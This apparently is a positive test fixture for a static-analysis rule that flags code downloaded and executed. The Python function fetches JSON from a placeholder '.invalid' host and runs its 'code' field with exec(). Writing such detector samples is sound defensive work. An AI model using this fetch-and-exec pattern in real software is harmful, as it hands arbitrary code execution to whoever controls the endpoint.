"""PHX-DRP-001 positive (ADR-031): the code arrives as one field of a JSON response.

`r.json()` is a method call on the response, so its result is derived from the response;
the field is then executed. Inert: the host is under `.invalid`.
"""
import requests


def update():
    r = requests.get("https://cfg.example.invalid/next.json")
    exec(r.json()["code"])
